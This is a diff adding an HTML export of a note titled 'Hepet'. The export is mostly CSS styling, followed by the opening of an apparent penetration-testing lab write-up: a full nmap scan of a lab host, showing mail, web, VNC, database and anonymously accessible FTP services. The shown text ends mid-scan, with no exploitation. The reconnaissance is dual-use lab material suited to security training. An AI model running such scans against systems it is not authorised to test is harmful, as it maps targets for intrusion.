@@ -1,0 +1,1636 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Hepet</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Hepet</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="hepet">Hepet</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.145.140 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 15:27 -0500
+Nmap scan report for 192.168.145.140
+Host is up (0.0063s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE        VERSION
+25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
+| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP
+|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is &apos;Maiser&apos;.
+79/tcp    open  finger         Mercury/32 fingerd
+| finger: Login: Admin         Name: Mail System Administrator\x0D
+| \x0D
+|_[No profile information]\x0D
+105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
+106/tcp   open  pop3pw         Mercury/32 poppass service
+110/tcp   open  pop3           Mercury/32 pop3d
+|_pop3-capabilities: APOP TOP USER EXPIRE(NEVER) UIDL
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+143/tcp   open  imap           Mercury/32 imapd 4.62
+|_imap-capabilities: IMAP4rev1 X-MERCURY-1A0001 complete OK CAPABILITY AUTH=PLAIN
+443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+| tls-alpn: 
+|_  http/1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: Time Travel Company Page
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+445/tcp   open  microsoft-ds?
+2224/tcp  open  http           Mercury/32 httpd
+|_http-title: Mercury HTTP Services
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-title: Time Travel Company Page
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+|_http-open-proxy: Proxy might be redirecting requests
+| http-methods: 
+|_  Potentially risky methods: TRACE
+11100/tcp open  vnc            VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|_    Unknown security type (40)
+20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
+| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
+| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
+| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
+| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
+| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
+| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
+| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
+| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
+| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
+| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
+|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
+33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
+49664/tcp open  msrpc          Microsoft Windows RPC
+49665/tcp open  msrpc          Microsoft Windows RPC
+49666/tcp open  msrpc          Microsoft Windows RPC
+49667/tcp open  msrpc          Microsoft Windows RPC
+49668/tcp open  msrpc          Microsoft Windows RPC
+49669/tcp open  msrpc          Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=1/28%OT=25%CT=1%CU=38377%PV=Y%DS=4%DC=T%G=Y%TM=697A71F
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=1
+OS:05%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%TS=U)
+OS:SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=103%TI=I%CI=
+OS:I%TS=U)OPS(O1=M578NW0NNS%O2=M578NW0NNS%O3=M578NW0%O4=M578NW0NNS%O5=M578N
+OS:W0NNS%O6=M578NNS)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)ECN
